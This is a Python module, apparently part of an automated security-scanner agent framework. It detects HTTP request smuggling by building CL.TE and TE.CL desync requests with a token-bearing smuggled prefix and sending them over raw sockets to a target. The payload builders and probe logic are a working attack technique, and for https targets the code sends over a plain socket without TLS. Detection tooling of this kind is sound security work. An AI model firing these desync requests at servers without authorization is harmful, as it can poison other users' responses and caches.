"""
Smart Request Smuggling Hunter - HTTP リクエストスマグリング検出 (SGK-2026-0503)

front-end（リバースプロキシ/LB/CDN）と back-end が、リクエストの本体長を
Content-Length と Transfer-Encoding のどちらで判断するかで食い違うと、片方が本体の
一部を「次のリクエストの先頭」として解釈する＝リクエストスマグリング（desync）。別ユーザー/
別リクエストへの汚染・認可バイパス・キャッシュ汚染・資格情報奪取に直結する高深刻度。

確定は「トークン相関のクロスリクエスト汚染」で行う（捏造不可・決定論的）:
  1. clean baseline: 通常の victim リクエストの応答を取る（トークン非出現）。
  2. smuggle: 隠しプレフィックスに**一意トークン**を仕込んだ desync リクエスト（CL.TE / TE.CL）を送る。
  3. victim: 別接続で通常リクエストを送る。その応答に**スマグル側にしか無いトークンが出現**すれば、
     我々のリクエストの一部が別リクエストの処理に混入した＝スマグリング確定。
差分（clean にトークン無し × poisoned にトークン有り）が「別リクエストへ混入した」決定的証拠。

生のバイト列を制御する必要があるため HTTP クライアントでなく raw socket で送受信する
（``self._raw_send`` seam・既定は実 socket）。非破壊（良性トークンの観測のみ・状態変更なし）。
"""
import logging
import secrets
import socket
import time
import urllib.parse
from typing import Any, Callable, Dict, List, Optional, Tuple

from src.core.agents.swarm.base import Specialist, Task
from src.core.models.finding import Finding, VulnType, Severity, Evidence

logger = logging.getLogger(__name__)

_RESP_CAP = 800


def _default_raw_send(host: str, port: int, data: bytes, timeout: float) -> bytes:
    """1 本の TCP 接続で raw バイト列を送り、HTTP/1.1 応答を1つ読んで返す。

    keep-alive 対象では「切断まで」読むと毎回タイムアウト待ちになるため、ヘッダの
    Content-Length を見て本体まで読めたら即返す（CL が無ければ短い読み取りタイムアウトで打ち切る）。
    """
    # 応答1つを読むための短い読み取りタイムアウト（総 timeout とは別・keep-alive 対策）。
    read_timeout = min(float(timeout), 5.0)
    out = b""
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(read_timeout)
        s.sendall(data)
        content_length: Optional[int] = None
        header_end = -1
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                out += chunk
                if header_end < 0 and b"\r\n\r\n" in out:
                    header_end = out.index(b"\r\n\r\n") + 4
                    head = out[:header_end].lower()
                    for line in head.split(b"\r\n"):
                        if line.startswith(b"content-length:"):
                            try:
                                content_length = int(line.split(b":", 1)[1].strip())
                            except ValueError:
                                content_length = None
                            break
                if header_end >= 0 and content_length is not None:
                    if len(out) >= header_end + content_length:
                        break  # 応答1つを読み切った
        except socket.timeout:
            pass
    return out


def _body_text(resp: bytes) -> str:
    """応答からヘッダを除いた本体（判定と証拠提示に使う）を文字列で返す。"""
    if b"\r\n\r\n" in resp:
        body = resp.split(b"\r\n\r\n", 1)[1]
    else:
        body = resp
    return body.decode("latin-1", errors="replace")


def build_clte_smuggle(path: str, host: str, prefix: bytes) -> bytes:
    """CL.TE: front が Content-Length、back が Transfer-Encoding を尊重する不一致を突く。

    body = ``0\\r\\n\\r\\n`` + prefix。Content-Length は body 全体を指すので front は全部転送、
    back は chunked 終端(``0``)で本体を切り、prefix を次リクエストの先頭として残す。
    """
    body = b"0\r\n\r\n" + prefix
    return (
        b"POST " + path.encode() + b" HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n" + body
    )


def build_tecl_smuggle(path: str, host: str, prefix: bytes) -> bytes:
    """TE.CL: front が Transfer-Encoding、back が Content-Length を尊重する不一致を突く。

    front は chunked を読み終端まで転送、back は Content-Length=<小> しか読まず、残り（prefix）を
    次リクエストの先頭として残す。
    """
    chunk = prefix
    size_line = ("%x" % len(chunk)).encode()
    # back の Content-Length を小さく（先頭のサイズ行のみ）して残りを溢れさせる。
    cl = len(size_line) + 2
    return (
        b"POST " + path.encode() + b" HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: " + str(cl).encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n" +
        size_line + b"\r\n" + chunk + b"\r\n0\r\n\r\n"
    )


_VARIANT_BUILDERS: Dict[str, Callable[[str, str, bytes], bytes]] = {
    "clte": build_clte_smuggle,
    "tecl": build_tecl_smuggle,
}


class SmartRequestSmugglingHunter(Specialist):
    name = "SmartRequestSmugglingHunter"
    description = "HTTP request smuggling detector (CL.TE / TE.CL cross-request poisoning)"
    timeout_seconds = 120
    is_aggressive = False

    def __init__(self, config: Dict = None):
        super().__init__()
        self.config = config or {}

    async def execute(self, task: Task, quick_mode: bool = False) -> List[Finding]:
        result = self._probe(task)
        if result is None:
            return []
        return [self._build_finding(task.target, result)]

    def _params(self, task: Task) -> Dict[str, Any]:
        return task.params if isinstance(getattr(task, "params", None), dict) else {}

    def _endpoint(self, task: Task) -> Tuple[str, int, str]:
        params = self._params(task)
        target = str(params.get("smuggling_url") or task.target)
        parsed = urllib.parse.urlparse(target if "://" in target else "http://" + target)
        host = parsed.hostname or "localhost"
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = str(params.get("smuggling_path") or parsed.path or "/") or "/"
        return host, int(port), path

    def _raw(self, host: str, port: int, data: bytes) -> bytes:
        sender = getattr(self, "_raw_send", None) or _default_raw_send
        return sender(host, port, data, float(self.timeout_seconds))

    def _victim_request(self, host: str, path: str) -> bytes:
        return (
            b"GET " + path.encode() + b" HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"Content-Length: 0\r\n\r\n"
        )

    def _probe(self, task: Task) -> Optional[Dict[str, Any]]:
        host, port, path = self._endpoint(task)
        params = self._params(task)
        variants = params.get("smuggling_variants") or ["clte", "tecl"]
        victim = self._victim_request(host, path)

        for variant in variants:
            builder = _VARIANT_BUILDERS.get(str(variant).lower())
            if builder is None:
                continue
            token = "smug" + secrets.token_hex(5)
            prefix = (
                b"GET /" + token.encode() + b" HTTP/1.1\r\n"
                b"X-Smuggle: " + token.encode()
            )
            smuggle = builder(path, host, prefix)
            try:
                # clean baseline（スマグル前）: victim 応答にトークンが無いことの基準。
                clean_resp = self._raw(host, port, victim)
                # desync リクエスト送信 → 直後に victim を送る。
                self._raw(host, port, smuggle)
                time.sleep(0.15)
                poisoned_resp = self._raw(host, port, victim)
            except OSError as exc:
                logger.debug("[%s] raw send failed (%s): %s", self.name, variant, exc)
                continue
            clean_body = _body_text(clean_resp)
            poisoned_body = _body_text(poisoned_resp)
            # トークンがスマグル側にしか無く、victim 応答に混入していれば確定。
            if token in poisoned_body and token not in clean_body:
                return {
                    "request_url": f"http://{host}:{port}{path}",
                    "host": host,
                    "port": port,
                    "path": path,
                    "variant": str(variant).lower(),
                    "token": token,
                    "smuggle_request": smuggle.decode("latin-1", errors="replace"),
                    "victim_request": victim.decode("latin-1", errors="replace"),
                    "clean_victim_body": clean_body[:_RESP_CAP],
                    "poisoned_victim_body": poisoned_body[:_RESP_CAP],
                }
        return None

    def _build_finding(self, target_url: str, proof: Dict[str, Any]) -> Finding:
        variant = proof["variant"]
        token = proof["token"]
        url = proof["request_url"]
        smuggle_req = proof["smuggle_request"]
        victim_req = proof["victim_request"]
        clean_body = proof["clean_victim_body"]
        poisoned_body = proof["poisoned_victim_body"]
        vlabel = {"clte": "CL.TE (front-end=Content-Length, back-end=Transfer-Encoding)",
                  "tecl": "TE.CL (front-end=Transfer-Encoding, back-end=Content-Length)"}.get(
            variant, variant)

        poc_request = (
            f"# Step 1 — clean baseline victim request (unique token '{token}' is NOT present yet):\r\n"
            f"{victim_req}\r\n"
            f"# Step 2 — smuggling request ({vlabel}); the unique token is hidden in the SMUGGLED "
            "prefix only (front-end and back-end disagree on the body boundary):\r\n"
            f"{smuggle_req}\r\n"
            "\r\n"
            "# Step 3 — a normal victim request on a FRESH connection (no token in it):\r\n"
            f"{victim_req}"
        )
        poc_response = (
            "# Step 1 response — clean baseline victim response (token ABSENT):\r\n"
            f"{clean_body}\r\n"
            "\r\n"
            "# Step 3 response — victim response AFTER the smuggle (token PRESENT — the smuggled "
            "prefix was prepended to another request's processing):\r\n"
            f"{poisoned_body}\r\n"
            "\r\n"
            f"CORRELATION: the random token '{token}' was placed by us ONLY inside the SMUGGLED "
            f"prefix of the {vlabel} request (Step 2). It never appears in the victim request "
            "itself, yet it appears in the victim's response (Step 3) and is ABSENT from the clean "
            "baseline (Step 1). The only cause is the front-end and back-end disagreeing on the "
            "request boundary so our smuggled bytes were parsed as the start of another request "
            "=> HTTP request smuggling (desync) confirmed."
        )
        impact = (
            f"front-end と back-end が本体長の判断（Content-Length と Transfer-Encoding）で食い違う "
            f"{vlabel} の desync を確認した。スマグル要求の隠しプレフィックスにしか存在しない一意 token "
            f"'{token}' が、**別の victim 要求の応答に出現**した（clean baseline には非出現）。これは我々の"
            "要求の一部が別要求の処理に混入した決定的証拠＝リクエストスマグリング。別ユーザーへの応答汚染・"
            "認可/フロントの制御バイパス・キャッシュ汚染・資格情報や CSRF トークンの奪取に直結する高深刻度"
            "（非破壊＝良性トークンの観測のみ）。"
        )
        return Finding(
            target_url=target_url,
            vuln_type=VulnType.HTTP_REQUEST_SMUGGLING,
            severity=Severity.HIGH,
            title=f"HTTP Request Smuggling ({variant.upper()}) via CL/TE desync",
            description=(
                f"HTTP request smuggling confirmed ({vlabel}): a unique token placed only in the "
                f"smuggled prefix appeared in a separate victim request's response (absent from the "
                "clean baseline), proving cross-request poisoning via front-end/back-end desync."
            ),
            source_agent=self.name,
            confidence=0.96,
            impact=impact,
            reproduction_steps=[
                f"clean baseline: 通常の victim 要求を送り、応答にトークン '{token}' が無いことを確認する。",
                f"{vlabel} のスマグル要求（隠しプレフィックスに一意トークン）を送る。",
                "別接続で通常の victim 要求を送り、その応答にスマグル側のトークンが出現することを確認する"
                "（＝別要求への混入＝スマグリング）。",
            ],
            tags=["http_request_smuggling", "desync", variant, "high",
                  "http_request_smuggling_confirmed"],
            evidence=Evidence(
                request_method="POST",
                request_url=url,
                request_headers={"Transfer-Encoding": "chunked"},
                request_body=smuggle_req,
                response_status=200,
                response_headers={},
                response_body=poisoned_body,
            ),
            additional_info={
                "smuggling_evidence": {
                    "request_url": url,
                    "variant": variant,
                    "token": token,
                    "clean_victim_body": clean_body,
                    "poisoned_victim_body": poisoned_body,
                },
                "smuggling_replay": {
                    "host": proof["host"],
                    "port": proof["port"],
                    "path": proof["path"],
                    "variant": variant,
                },
                "poc_request": poc_request,
                "poc_response": poc_response,
            },
        )
